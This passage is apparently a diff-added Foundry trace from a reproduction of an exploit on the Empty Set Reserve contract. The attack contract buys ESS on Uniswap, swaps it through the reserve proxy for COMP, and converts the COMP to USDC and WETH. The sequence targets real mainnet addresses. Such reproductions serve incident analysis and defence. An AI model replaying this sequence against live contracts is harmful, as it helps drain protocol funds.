+    │   │   │   ├─ [24420] WETH9::approve(SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x062b8d6e7a06a8548cb104212d5523f915fccd3b417a43df6127fe201bb675b0: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [80236] SwapRouter::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, tokenOut: 0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e, fee: 3000, recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, deadline: 1753349015 [1.753e9], amountIn: 62460734547587260 [6.246e16], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   │   │   ├─ [72775] 0xd2Ef54450ec52347bde3dab7B086bf2a005601d8::swap(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], false, 62460734547587260 [6.246e16], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002bc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000bb824ae124c4cc33d6791f8e8b63520ed7107ac8b3e000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [11824] ESS::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 5616580521526973849442703 [5.616e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xd2Ef54450ec52347bde3dab7B086bf2a005601d8, to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 5616580521526973849442703 [5.616e24])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x209e5ab58644f72081f5779462d5488028fcb5b66b94bca1d321a648fe908842: 0x00000000000000000000000000000000000000000033fa5510d2d682f9fb1ec2 → 0x0000000000000000000000000000000000000000002f54f9a023ecb2e4568533
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000004b520ce59e514fe9440b6 → 0x000000000000000000000000000000000000000000095a7c3f08cee51438da45
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [2534] WETH9::balanceOf(0xd2Ef54450ec52347bde3dab7B086bf2a005601d8) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 793394767837339838 [7.933e17]
+    │   │   │   │   │   ├─ [10327] SwapRouter::uniswapV3SwapCallback(-5616580521526973849442703 [-5.616e24], 62460734547587260 [6.246e16], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002bc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000bb824ae124c4cc33d6791f8e8b63520ed7107ac8b3e000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   ├─ [6225] WETH9::transferFrom(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xd2Ef54450ec52347bde3dab7B086bf2a005601d8, 62460734547587260 [6.246e16])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xd2Ef54450ec52347bde3dab7B086bf2a005601d8, value: 62460734547587260 [6.246e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x209e5ab58644f72081f5779462d5488028fcb5b66b94bca1d321a648fe908842: 0x0000000000000000000000000000000000000000000000000b02b456779920be → 0x0000000000000000000000000000000000000000000000000be09c0b7eb7917a
+    │   │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000000dde7b5071e70bc → 0
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(0xd2Ef54450ec52347bde3dab7B086bf2a005601d8) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 855855502384927098 [8.558e17]
+    │   │   │   │   │   ├─ emit Swap(param0: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], param1: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: -5616580521526973849442703 [-5.616e24], param3: 62460734547587260 [6.246e16], param4: 9159125260197587442287155 [9.159e24], param5: 3161695163415053828511 [3.161e21], param6: -181316 [-1.813e5])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000493433288460b4ae155e70343de86 → 0x0000000000000000000000000000000000049441be991fdf152034ecf7e55afb
+    │   │   │   │   │   │   @ 0: 0x000100000200020001fd2d24000000000000000000064912ada84e5deabc1e29 → 0x000100000200020000fd3bbc0000000000000000000793852cddc04c6d1d4233
+    │   │   │   │   │   │   @ 8: 0x010000000000000000000b618e74aad30f778bf412ffee1058932b44687831d7 → 0x010000000000000000000b702d1722115881a14957ffedf4baff79b86881fb97
+    │   │   │   │   │   └─ ← [Return] -5616580521526973849442703 [-5.616e24], 62460734547587260 [6.246e16]
+    │   │   │   │   └─ ← [Return] 5616580521526973849442703 [5.616e24]
+    │   │   │   ├─ [25127] ESS::approve(Empty Set Reserve proxy: [0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Empty Set Reserve proxy: [0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B], value: 79228162514264337593543950335 [7.922e28])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x3f74a38adf0b507bcb9a7d40676f667231b413c9783a080699398cfb42f11209: 0 → 0x0000000000000000000000000000000000000000ffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [80437] Empty Set Reserve proxy::fallback(COMP: [0xc00e94Cb662C3520282E6f5717214004A7f26888], ESS: [0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e], 11102746856346403118005018 [1.11e25])
+    │   │   │   │   ├─ [79699] Empty Set Reserve implementation::swap(COMP: [0xc00e94Cb662C3520282E6f5717214004A7f26888], ESS: [0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e], 11102746856346403118005018 [1.11e25]) [delegatecall]
+    │   │   │   │   │   ├─ [2360] 0xC5285EE6D5C9Adf4E04f5CCB47d0501AE638c7A9::dollar() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000605d26fbd5be761089281d5cec2ce86eea667109
+    │   │   │   │   │   ├─ [12533] ESS::transferFrom(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Empty Set Reserve proxy: [0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B], 11102746856346403118005018 [1.11e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Empty Set Reserve proxy: [0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B], value: 11102746856346403118005018 [1.11e25])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x246111d08239720c8a9bc73e660d31d4813ae492954e548dfdbdb322b262f324: 0x000000000000000000000000000000000000000000202c540cb0560205ebbbfc → 0x000000000000000000000000000000000000000000295b6d29a52318a89bf716
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000095a7c3f08cee51438da45 → 0x000000000000000000000000000000000000000000002b63221401ce71889f2b
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [35790] COMP::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 41581642538295042664 [4.158e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Empty Set Reserve proxy: [0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 41581642538295042664 [4.158e19])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0 → 0x000000000000000000000000000000000000000000000002410fab9460592268
+    │   │   │   │   │   │   │   @ 0xa6e6262e19ac5222241e3f3b0ca55ea57c4121e2f872caab2b879538d94c3a1f: 0x000000000000000000000000000000000000000000000002410fab9460592269 → 1
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ emit Swap(makerToken: COMP: [0xc00e94Cb662C3520282E6f5717214004A7f26888], takerToken: ESS: [0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e], takerAmount: 11102746856346403118005018 [1.11e25], makerAmount: 41581642538295042664 [4.158e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xb8e08a97f56d5e1f59649b0c427e995ded06db8b16c13b099aa2fd7b6bfd4899: 0x000000000000000000000000000000000000000000000002410fab9460592269 → 1
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [25124] COMP::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 79228162514264337593543950335 [7.922e28])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xaff07f330ed1d5b1d7b4fd07d695bacc4dfd3911e3c407ba8fe5784e6a65bed8: 0 → 0x0000000000000000000000000000000000000000ffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [90836] UniswapV2Router02::swapExactTokensForTokens(9615500579758040742 [9.615e18], 0, [0xc00e94Cb662C3520282E6f5717214004A7f26888, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1753349015 [1.753e9])
+    │   │   │   │   ├─ [2504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2288289018922953559997 [2.288e21], 30424012655250449402 [3.042e19], 1753348091 [1.753e9]
+    │   │   │   │   ├─ [504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 14488809077677 [1.448e13], 3988962470292275940790 [3.988e21], 1753349015 [1.753e9]
+    │   │   │   │   ├─ [12441] COMP::transferFrom(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f], 9615500579758040742 [9.615e18])
+    │   │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f], value: 9615500579758040742 [9.615e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2cc95c90195bd49ed2ccc92390bbd2e07211080194e9a7b84c0191dbf1dfc106: 0x00000000000000000000000000000000000000000000007c0c63b2d5e9c34fbd → 0x00000000000000000000000000000000000000000000007c91d4d1aaf3cdb663
+    │   │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000000000000002410fab9460592268 → 0x000000000000000000000000000000000000000000000001bb9e8cbf564ebbc2
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [40707] UniswapV2Pair::swap(0, 126927878830904821 [1.269e17], UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], 0x)
+    │   │   │   │   │   ├─ [8062] WETH9::transfer(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], 126927878830904821 [1.269e17])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f], to: UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], value: 126927878830904821 [1.269e17])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xb374801ace2c02f5db0425ab5920a2b7ed1d5a00abbcd395fda7530ba1d666c0: 0x0000000000000000000000000000000000000000000000d83df9884d47c94db6 → 0x0000000000000000000000000000000000000000000000d83fbc78890198a3ab
+    │   │   │   │   │   │   │   @ 0x3a2954c632354fbb1bdebdee5ff2b2e93cfb57b23485d2f5908508f03f41728d: 0x000000000000000000000000000000000000000000000001a637ce510e3123fa → 0x000000000000000000000000000000000000000000000001a474de155461ce05
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [788] COMP::balanceOf(UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2297904519502711600739 [2.297e21]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 30297084776419544581 [3.029e19]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 2297904519502711600739 [2.297e21], reserve1: 30297084776419544581 [3.029e19])
+    │   │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 9615500579758040742 [9.615e18], amount1In: 0, amount0Out: 0, amount1Out: 126927878830904821 [1.269e17], to: UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 10: 0x0000000000000000000000000001299c56972b9ab0884f6f4cc2d8afa4f4adec → 0x0000000000000000000000000001299d661037c576c2082b207a1b4cd7999f5c
+    │   │   │   │   │   │   @ 8: 0x6881f7fb000000000001a637ce510e3123fa00000000007c0c63b2d5e9c34fbd → 0x6881fb97000000000001a474de155461ce0500000000007c91d4d1aaf3cdb663
+    │   │   │   │   │   │   @ 9: 0x000000000000000000000000000000e969362d6b7f5e0684ff323cee5202dca2 → 0x000000000000000000000000000000e969427665c1b82a6d9c1437a13774a7ca
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [19432] UniswapV2Pair::swap(459632937 [4.596e8], 0, EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [5452] USDC::fallback(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 459632937 [4.596e8])
+    │   │   │   │   │   │   ├─ [4663] FiatTokenV2_2::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 459632937 [4.596e8]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 459632937 [4.596e8])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x0000000000000000000000000000000000000000000000000000000238eb997f → 0x0000000000000000000000000000000000000000000000000000000254510aa8
+    │   │   │   │   │   │   │   │   @ 0x28c0947f463362aab09a2d7896ccc847fb7e52633a16b978fb2caf3db1a9b8f8: 0x00000000000000000000000000000000000000000000000000000d2d70517bad → 0x00000000000000000000000000000000000000000000000000000d2d54ec0a84
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [1339] USDC::fallback(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [staticcall]
+    │   │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14488349444740 [1.448e13]
+    │   │   │   │   │   │   └─ ← [Return] 14488349444740 [1.448e13]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3989089398171106845611 [3.989e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 14488349444740 [1.448e13], reserve1: 3989089398171106845611 [3.989e21])
+    │   │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 126927878830904821 [1.269e17], amount0Out: 459632937 [4.596e8], amount1Out: 0, to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x6881fb970000000000d83df9884d47c94db600000000000000000d2d70517bad → 0x6881fb970000000000d83fbc78890198a3ab00000000000000000d2d54ec0a84
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return] [9615500579758040742 [9.615e18], 126927878830904821 [1.269e17], 459632937 [4.596e8]]
+    │   │   │   ├─ [50485] UniswapV2Router02::swapExactTokensForTokens(31966141958537001922 [3.196e19], 0, [0xc00e94Cb662C3520282E6f5717214004A7f26888, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1753349015 [1.753e9])
+    │   │   │   │   ├─ [504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2297904519502711600739 [2.297e21], 30297084776419544581 [3.029e19], 1753349015 [1.753e9]
+    │   │   │   │   ├─ [5641] COMP::transferFrom(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f], 31966141958537001922 [3.196e19])
+    │   │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f], value: 31966141958537001922 [3.196e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2cc95c90195bd49ed2ccc92390bbd2e07211080194e9a7b84c0191dbf1dfc106: 0x00000000000000000000000000000000000000000000007c91d4d1aaf3cdb663 → 0x00000000000000000000000000000000000000000000007e4d735e6a4a1c7225
+    │   │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000000000000001bb9e8cbf564ebbc2 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [36591] UniswapV2Pair::swap(0, 414450137186724488 [4.144e17], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [23162] WETH9::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 414450137186724488 [4.144e17])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 414450137186724488 [4.144e17])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x3a2954c632354fbb1bdebdee5ff2b2e93cfb57b23485d2f5908508f03f41728d: 0x000000000000000000000000000000000000000000000001a474de155461ce05 → 0x0000000000000000000000000000000000000000000000019eb471e12041637d
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x00000000000000000000000000000000000000000000000005c06c3434206a88
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [788] COMP::balanceOf(UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2329870661461248602661 [2.329e21]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0xCFfDdeD873554F362Ac02f8Fb1f02E5ada10516f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 29882634639232820093 [2.988e19]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 2329870661461248602661 [2.329e21], reserve1: 29882634639232820093 [2.988e19])
+    │   │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 31966141958537001922 [3.196e19], amount1In: 0, amount0Out: 0, amount1Out: 414450137186724488 [4.144e17], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x6881fb97000000000001a474de155461ce0500000000007c91d4d1aaf3cdb663 → 0x6881fb970000000000019eb471e12041637d00000000007e4d735e6a4a1c7225
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return] [31966141958537001922 [3.196e19], 414450137186724488 [4.144e17]]
+    │   │   │   ├─ [2712] PoolManager::sync(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48])
+    │   │   │   │   ├─ [1339] USDC::fallback(PoolManager: [0x000000000004444c5dc75cB358380D2e3dE08A90]) [staticcall]
+    │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(PoolManager: [0x000000000004444c5dc75cB358380D2e3dE08A90]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 77630102906826 [7.763e13]
+    │   │   │   │   │   └─ ← [Return] 77630102906826 [7.763e13]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [5452] USDC::fallback(PoolManager: [0x000000000004444c5dc75cB358380D2e3dE08A90], 10000000000 [1e10])
+    │   │   │   │   ├─ [4663] FiatTokenV2_2::transfer(PoolManager: [0x000000000004444c5dc75cB358380D2e3dE08A90], 10000000000 [1e10]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: PoolManager: [0x000000000004444c5dc75cB358380D2e3dE08A90], value: 10000000000 [1e10])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x0000000000000000000000000000000000000000000000000000000254510aa8 → 0x00000000000000000000000000000000000000000000000000000000004526a8
+    │   │   │   │   │   │   @ 0x3c2304a4bd8ffa93cccd3b8e4c28dbcd5c94236b1a7b40e3dc80ba6953b4cc7a: 0x0000000000000000000000000000000000000000000000000000469aaab527ca → 0x0000000000000000000000000000000000000000000000000000469cfec10bca
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [3313] PoolManager::settle()
+    │   │   │   │   ├─ [1339] USDC::fallback(PoolManager: [0x000000000004444c5dc75cB358380D2e3dE08A90]) [staticcall]
+    │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(PoolManager: [0x000000000004444c5dc75cB358380D2e3dE08A90]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 77640102906826 [7.764e13]
+    │   │   │   │   │   └─ ← [Return] 77640102906826 [7.764e13]
+    │   │   │   │   └─ ← [Return] 10000000000 [1e10]
+    │   │   │   └─ ← [Return] 0x
+    │   │   └─ ← [Return] 0x
+    │   ├─ [1339] USDC::fallback(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   ├─ [553] FiatTokenV2_2::balanceOf(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   └─ ← [Return] 4531880 [4.531e6]
+    │   │   └─ ← [Return] 4531880 [4.531e6]
+    │   ├─ [32044] UniswapV2Router02::swapExactTokensForTokens(4531880 [4.531e6], 0, [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1753349015 [1.753e9])
+    │   │   ├─ [504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 14488349444740 [1.448e13], 3989089398171106845611 [3.989e21], 1753349015 [1.753e9]
+    │   │   ├─ [6549] USDC::fallback(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], 4531880 [4.531e6])
+    │   │   │   ├─ [5754] FiatTokenV2_2::transferFrom(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], 4531880 [4.531e6]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], value: 4531880 [4.531e6])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x00000000000000000000000000000000000000000000000000000000004526a8 → 0
+    │   │   │   │   │   @ 0x47d1cbba1df0481e28f5a25694f143bb6795d54d92921a0ff96c452a44100da9: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffff26fdabf → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffff22ab417
+    │   │   │   │   │   @ 0x28c0947f463362aab09a2d7896ccc847fb7e52633a16b978fb2caf3db1a9b8f8: 0x00000000000000000000000000000000000000000000000000000d2d54ec0a84 → 0x00000000000000000000000000000000000000000000000000000d2d5531312c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [17242] UniswapV2Pair::swap(0, 1244022632550036 [1.244e15], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   ├─ [3262] WETH9::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1244022632550036 [1.244e15])
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1244022632550036 [1.244e15])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xb374801ace2c02f5db0425ab5920a2b7ed1d5a00abbcd395fda7530ba1d666c0: 0x0000000000000000000000000000000000000000000000d83fbc78890198a3ab → 0x0000000000000000000000000000000000000000000000d83fb80d1a6a7d9517
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000005c06c3434206a88 → 0x00000000000000000000000000000000000000000000000005c4d7a2cb3b791c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1339] USDC::fallback(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [staticcall]
+    │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [delegatecall]
